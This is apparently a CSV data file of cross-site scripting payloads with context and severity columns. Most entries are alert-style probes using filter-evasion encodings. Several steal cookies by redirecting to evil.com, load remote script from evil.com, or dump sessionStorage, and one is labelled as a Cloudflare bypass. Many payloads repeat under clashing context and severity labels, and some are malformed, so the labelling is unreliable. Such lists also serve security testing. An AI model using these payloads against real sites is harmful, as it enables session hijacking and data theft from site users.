payload,context,severity
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<svg////////onload=alert(1)>,html_body,medium
java%09script:alert(1),html_body,medium
oninput=”alert(‘AnonKryptiQuz’),html_body,medium
<svg////////onload=alert(1)>,html_body,medium
"onerror=""alert(1)""",html_body,medium
confirm(1),attribute,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<svg/onload=alert(1)>,tag_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"""></tag><svg onload=alert(1)>",html_body,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",html_body,high
javascript:alert(document.domain),js_uri,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
onkeydown=”alert(‘AnonKryptiQuz’),html_body,medium
<img/src=x onerror=alert(1)//>,event_handler,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,high
<%00script>d.innerHTML+='';</script>,html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
<BODY ONLOAD=alert(8839)>,html_body,medium
<img/’onerror=alert(1) src=a>,html_body,medium
<video src=x onerror=\u0061\u006cert(1)>,attribute,low
javascr/**/ipt:alert(document.domain),js_uri,high
<details open ontoggle=alert(1)>,event_handler,high
"onerror=""alert(1)""",html_body,medium
javascript:alert(1),attribute,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)>,event_handler,low
onerror=alert(0);>,html_body,medium
${alert(1)},script_injection,high
onmouseover=”alert(‘AnonKryptiQuz’),html_body,medium
"""><img src=x onerror=alert(1)>",template_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
<img src/onerror=prompt(8)>,html_body,medium
<object>d.innerHTML+='';</script>,attribute,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
onload&#61;'alert(1)',html_body,medium
<img src=x onerror=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute,high
"""><script alert(String.fromCharCode(88,83,83))</script>",js_block,high
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
"""><svg onload=alert()>",html_body,medium
javascript:confirm(1),js_uri,high
<script>prompt(1)</script>,script_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
<script>confirm(1)</script>,script_injection,medium
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"data:text/html,<script>alert(1)</script>",js_uri,high
<svg><a onload=alert(1)></a>,html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
' onmouseover=alert(1) ',attribute,low
<svgonload=alert(1)>,html_body,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"onload=""print()""",html_body,medium
innerHTML=location.hash>#<script>window.alert(1)</script>,attribute,high
"location=""javascript:alert(1)""",dom_sink,low
#{confirm(1)},template_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",tag_injection,low
-alert(23)/,html_body,medium
<input onfocus=alert(1) autofocus>,event_handler,low
"""><a>a</a><img src=x onerror=confirm`1`>{{9-9}}';alert(0);://",js_block,high
<img src/onerror=alert(1)>,html_body,medium
-alert(1)-',html_body,medium
嘼img src=1 onerror=alert(1)嘾,attribute,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
#{alert(1)},template_injection,low
alert(2),html_body,medium
javascript:alert(	document.domain),js_uri,medium
<audio src/onerror=alert(1)>,html_body,medium
onerror='alert(1)',html_body,medium
<svg onload=confirm(1)>,event_handler,high
innerHTML=location.hash>#<%00script>alert(1)</script>,attribute,high
"\"" onerror=alert(1)//",attribute_escape,low
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
‘)alert(1);//,attribute,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<svg onload=alert(1)>,event_handler,low
"<iframe src=""javascript:alert(1)"">",script_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",template_injection,high
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,high
"javascript:void(document.location=""http://evil.com"")",attribute,low
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
\' onerror=alert(1)//,attribute_escape,high
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""></tag><svg onload=alert(1)>",html_body,medium
<details open ontoggle=alert(1)>,template_injection,medium
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
' onerror=alert(1) x=',attribute,low
""" onfocus=alert(1) autofocus=""",attribute,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
<svg onload=alert(1)>,event_handler,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,dom_sink,medium
"""><Svg oNLoaD=alErT(1)>",html_body,medium
<audio src/onerror=alert(1)>,html_body,medium
javascript:confirm(1),template_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
&lt;body onload=alert(1)&gt;,js_uri,medium
<%= alert(1) %>,attribute_escape,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
#{alert(1)},template_injection,low
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
<svg////////onload=alert(1)>,html_body,medium
"<script>D.iNnErhTMl+='';</ScrIpT>//[""'`-->]]>]</diV>",html_body,high
-alert(1)-',html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(document.cookie))</SCRIPT>",html_body,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
"?alert(1)"",",html_body,medium
"location=""javascript:alert(1)""",dom_sink,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
\' onerror=alert(1)//,attribute_escape,low
&quot; onerror=confirm(1) x=&quot;,attribute_escape,low
javascript:confirm(1),js_uri,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
<img src/onerror=alert(1)>,html_body,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
<script>confirm(1)</script>,script_injection,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
"<SCRiPt>D.INNeRHtMl+='';</SCRipt>//[""'`-->]]>]</dIv>",attribute,high
<svg/onload=confirm(1)>,tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<marquee onstart=confirm(1)>,event_handler,low
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<svg onload=alert(1)>,event_handler,high
<input onfocus=alert(1) autofocus>,event_handler,low
javascript:confirm(1),js_uri,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
e71%3balert(1)//503466e3,html_body,medium
<input onfocus=al'+'ert(1) autofocus>,event_handler,low
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
<img/src=x onerror=confirm(1)//>,event_handler,medium
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),template_injection,medium
"<object data=""javascript:al'+'ert(1)"">",dom_sink,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,medium
"<svg onload=""confirm(7)"">",html_body,medium
alert(1);,html_body,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"onload&#61;""alert(1)""",html_body,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
javaSCRIPT:confirm(1),js_uri,medium
`${alert(1)}`,js_string,medium
javascript:alert(1),js_uri,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(6715)&gt;`>,url,high
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
<svg onload=confirm(1)>,html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
confirm(),html_body,medium
<img/src/onerror=alert(1),html_body,medium
${\u0061\u006cert(1)},event_handler,high
<script src=//evil.com/xss.js></script>,script_injection,medium
<%= alert(1) %>,template_injection,high
<svg////////onload=alert(1)>,html_body,medium
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
sEtInTERVal('aLe'+'RT(10)');,attribute,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<ScrIPt>D.InneRhtml+='';</ScrIPT>//[""'`-->]]>]</Div>",attribute,high
< svg onload=alert()>,html_body,medium
\' onerror=alert(1)//,attribute_escape,medium
confirm(),html_body,medium
<scr/**/ipt>prompt(1)</scr/**/ipt>,attribute,medium
"document.write(""<img src=x onerror=alert(1)>"")",event_handler,low
<img src/onerror=alert(1)>,html_body,medium
<svg id=1 onload=confirm(1)>,html_body,medium
{{7*7}},template_injection,high
""" onfocus=alert(1) autofocus=""",attribute,medium
javascript:alert(document.domain),js_uri,high
<img src/onerror=alert(1)>,html_body,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,medium
-alert(23)/,html_body,medium
<%00script>d.innerHTML+='';</script>,html_body,high
<input onfocus=alert(1) autofocus>,event_handler,high
#javascript:alert(2);,url,medium
<%00svg onload=alert()>,html_body,medium
"""><SVg OnLoaD=aLert()>",html_body,medium
<img src=x onerror=al'+'ert(1)>,event_handler,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
<script>confirm(1)</script>,script_injection,medium
javascript:confirm(1),js_uri,medium
"\"" onerror=alert(1)//",attribute_escape,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
#{confirm(1)},template_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<svgonload=alert(1)>,html_body,medium
onlOAD='alERt(1)',html_body,medium
prompt(9),html_body,medium
"""><form onload=alert()>",html_body,medium
<ImG SrC=X OnErRoR=AlErT(1)>,tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute,medium
' ><img src=x onerror=alert(1)>,attribute,medium
javascript:alert(	document.domain),js_uri,low
<svg onload=alert()>,html_body,medium
"""><svg onload=alert()>",html_body,medium
<svg onload=alert()>,html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"\"" onerror=alert(1)//",attribute_escape,medium
#{alert(1)},js_uri,low
"confirm(1))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"""><img src=x onerror=confirm(1)>",attribute,high
<marquee onstart=alert(1)>,event_handler,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<SvG oNLoAD=AleRt()>,html_body,medium
<video src=x onerror=alert(1)>,event_handler,medium
' onmouseover=alert(1) ',attribute,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
alert(1),html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
${alert(1)},template_injection,medium
onload='alert(1)',html_body,medium
<svg/onload=alert(1)>,js_uri,low
onload=”alert(‘AnonKryptiQuz’),html_body,medium
${alert(1)},js_uri,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<svg/onload=alert(1)>,tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
<svg><a onload=alert(1)></a>,html_body,medium
"""></tag><svg onload=alert(1)>",html_body,medium
"\"" onerror
=alert(	1)//",attribute_escape,medium
\x3csvg onload=alert(1)\x3e,attribute_escape,high
""" onerror=confirm`1`1 a=""",attribute,medium
alert(1),html_body,medium
<img/src/onerror=alert(1),html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"javascript:void(document.location=""http://evil.com"")",tag_injection,low
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"""><script/ alert(String.fromCharCode(88,83,83))</script>",attribute,high
"onload=""top.alert(1)""",html_body,medium
"location=""javascript:alert(1)""",dom_sink,low
"""><svg onload=alert()>",html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
</script><svg onload=alert(1)>,html_body,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
prompt(1),attribute,medium
onerror='alert(1)',html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
"location
=""javascript:alert(	1)""",dom_sink,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
onerror=alert(0);>,html_body,medium
"alert`1`)//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<scr/**/ipt>alert(1)</scr/**/ipt>,script_injection,medium
<details open ontoggle=alert(1)>,event_handler,medium
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",script_injection,high
"location=""javascript:alert(1)""",dom_sink,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
\x3cimg src=x onerror=alert(1)\x3e,tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",attribute,high
<script>alert(1)</script>,tag_injection,medium
javascript:alert(1),js_uri,high
"data:text/html,<SCRIPT>alert(1)</SCRIPT>",dom_sink,medium
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
alert(1);,html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
""" onload=alert(1) x=""",attribute,medium
"onerror=""alert(1)""",html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<script>alert(	1)</script>,script_injection,low
<BODY ONLOAD=alert(8839)>,html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
"""><script	>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"<%
= alert(	1) %>",template_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"eval(""alert(1)"")",attribute_escape,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
&quot; onerror=alert(1) x=&quot;,script_injection,high
${\u0061\u006cert(1)},template_injection,low
onErROR='ALERt(1)',attribute,medium
<script>prompt(1)</script>,script_injection,high
< script>d.innerHTML+='';</script>,html_body,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
innerHTML=location.hash>#<script	>alert(1)</script>,html_body,high
<SVG Onload=alErT()>,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
"//"";ALeRT(sTRIng.FROMCHarCODe(88,83,83))",html_body,high
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
onload='alert(1)',html_body,medium
#{alert(1)},template_injection,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<image src/onerror=alert(1)>,html_body,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
<img/’onerror=alert(1) src=a>,html_body,medium
"""><svg onload=alert()>",html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
<body onload=alert(1)>,tag_injection,low
"""><img src=x onerror=alert(1)>",attribute,high
"%20""><svg onload=alert(1)>",html_body,medium
#{alert(1)},template_injection,high
"data:text/html,<script>confirm(1)</script>",js_uri,medium
"eval(""alert(1)"")",dom_sink,low
"""><table onload=alert()>",html_body,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
; alert(1);//,html_body,medium
javascript:prompt(1),url,medium
' onload=alert(1) x=',attribute,low
<input onfocus=al'+'ert(1) autofocus>,event_handler,low
alert(2),html_body,medium
""" onload=alert(1) x=""",attribute,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
onpointerover=”alert(‘AnonKryptiQuz’),html_body,medium
javascript:confirm(1),js_uri,low
"setTimeout(""alert(1)"",0)",dom_sink,medium
javascript:alert(1),js_uri,high
<video src=x onerror=alert(1)>,js_uri,high
<details open ontoggle=alert(1)>,event_handler,low
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
{{7*7}},template_injection,medium
<img/src/onerror=alert(1),html_body,medium
' ><img src=x onerror=alert(1)>,attribute,medium
javascript:print()//,url,medium
{{7*7}},script_injection,low
<svg onload=alert()>,html_body,medium
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",attribute,high
javascript:alert(document.domain),js_uri,high
<img src/onerror=prompt(8)>,html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
"document.write(""\x3cimg src=x onerror=alert(1)\x3e"")",script_injection,high
setInterval('ale'+'rt(10)');,html_body,high
"<img>alert(String.fromCharCode(88,83,83))</script>",html_body,high
${alert(1)},template_injection,high
${alert(1)},template_injection,low
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<img src=x onerror=alert(1)>,event_handler,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
"location=""javascript:alert(1)""",dom_sink,high
alert(2),html_body,medium
""" onerror=confirm(1) x=""",attribute,high
<script>alert(1)</script>,script_injection,high
<img/src=x onerror=alert(1)//>,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
""" onload=alert(1) x=""",event_handler,medium
javascript:confirm(1),js_uri,high
' ><iMg sRc=x oNeRrOr=aLeRt(1)>,attribute,medium
onload='alert(document.cookie)',html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
javascript:confirm(1),js_uri,high
"<iframe src=""javascript:alert(1)"">",js_uri,high
prompt(9),html_body,medium
"""><img src=x onerror=al'+'ert(1)>",dom_sink,high
javaSCRIPT:alert(1),js_uri,high
&quot; onerror=alert(1) x=&quot;,js_uri,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
' onerror=alert(1) x=',js_uri,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
prompt(9),html_body,medium
""" onerror=alert(1) x=""",attribute,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
javascript:confirm(1),attribute,medium
javascript:alert(	document.domain),dom_sink,high
"""><svg onload=alert()>",html_body,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
""" onfocus
=alert(	1) autofocus
=""",attribute,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<script>confirm(1)</script>,script_injection,high
&quot; onerror=alert(1) x=&quot;,js_uri,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
j\u0061v\u0061script:confirm(1),js_uri,high
javascript:alert(document.domain),js_uri,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
onload='alert(1)',html_body,medium
alert(1),html_body,medium
<svg/onload=confirm(1)>,js_uri,high
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<img src=x onerror=alert(1)>,tag_injection,low
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,low
onload='alert(1)',attribute,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
{{7*7}},template_injection,low
"//"";top.alert(1))",html_body,high
innerHTML=location.hash>#<body>alert(1)</script>,html_body,high
onERROR='AlErt(1)',html_body,medium
"<object data=""javascript:confirm(1)"">",tag_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
""" onfocus=alert(1) autofocus=""",attribute,medium
"\""><img src=x onerror=\u0061\u006cert(1)>",attribute_escape,low
javascript:alert(document.domain),script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<%= alert(1) %>,event_handler,medium
"""+onfocus=prompt(123)""+",attribute,medium
&lt;img/src=x onerror=alert(1)//&gt;,event_handler,medium
"<object data=""javaSCRIPT:alert(1)"">",tag_injection,low
"setTimeout(""alert(1)"",0)",dom_sink,high
confirm(1),attribute,medium
"eval(""alert(1)"")",attribute,low
"data:text/html,<script>alert(1)</script>",js_uri,high
{{7*7}},template_injection,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
top.alert(1))</SCRIPT>,html_body,high
"{{{}."")));alert(1)//""}}",js_block,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,low
""" onload=alert(1) x=""",attribute,low
"<iframe src=""javascript:alert(1)"">",tag_injection,low
javascript:confirm(1),js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
\' onerror=alert(1)//,template_injection,medium
"\""><img src=x onload=alert(1)>",attribute_escape,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
;alert(1);,html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
&lt;body onload=alert(1)&gt;,template_injection,high
<image src/onerror=alert(1)>,html_body,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"eval(""alert(1)"")",dom_sink,high
<script src=//evil.com/xss.js></script>,script_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,medium
javascript:alert(1),js_uri,low
&quot; onerror=alert(1) x=&quot;,template_injection,low
"document.write(""<svg src=x onerror=alert(1)>"")",dom_sink,medium
onload='alert(1)',html_body,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,high
onclick=”alert(‘AnonKryptiQuz’),html_body,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
javascript:confirm(1),dom_sink,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<iframe/onload=alert(0);>,html_body,medium
\' onerror=alert(1)//,template_injection,medium
""" onload=confirm(1) x=""",attribute,high
<svgonload=alert(1)>,html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
&lt;script&gt;confirm(1)&lt;/script&gt;,script_injection,high
<img/src=x onerror=confirm(1)//>,script_injection,low
' oNmOuSeOvEr=aLeRt(1) ',attribute,high
<svg/onload=alert(1)>,tag_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
onload='alert(1)',html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
onerror=prompt`1`;>,html_body,medium
"\"" onerror=alert(1)//",dom_sink,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
${alert(1)},template_injection,medium
jAvAsCrIpT:AlErT(1),js_uri,low
javascript:alert(document.domain),js_uri,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<svg////////onload=alert(1)>,html_body,medium
""" onload=alert(1) x=""",attribute,medium
javascript:confirm(1),js_uri,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
</tag><svg onload=alert(1)>,html_body,medium
"document.body.innerHTML=""%3Cimg src=x onerror=alert(1)%3E""",dom_sink,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
javascript:alert(document.domain),event_handler,medium
' onerror=alert(1) x=',attribute_escape,medium
\x3cbody onload=alert(1)\x3e,tag_injection,high
\' onerror=alert(1)//,attribute_escape,high
<svg/onload=alert(1)>,dom_sink,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"""><svg onload=alert()>",html_body,medium
"OnloAd=""AlErT(1)""",html_body,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
"<svg/onload=alert(String.fromCharCode(88,83,83))>",html_body,high
<svg/onload=alert(1)>,tag_injection,medium
<svg onload=alert(1)>,tag_injection,medium
"location=""javascript:confirm(1)""",event_handler,high
<ScRiPt>cOnFiRm(1)</sCrIpT>,script_injection,medium
"<table>alert(String.fromCharCode(88,83,83))</script>",attribute,high
"?alert(1)"",",html_body,medium
<%= alert(1) %>,template_injection,low
<video src=x onerror=alert(1)>,event_handler,medium
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
"<svG/x="">""/oNloaD=alert`1`//",attribute,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
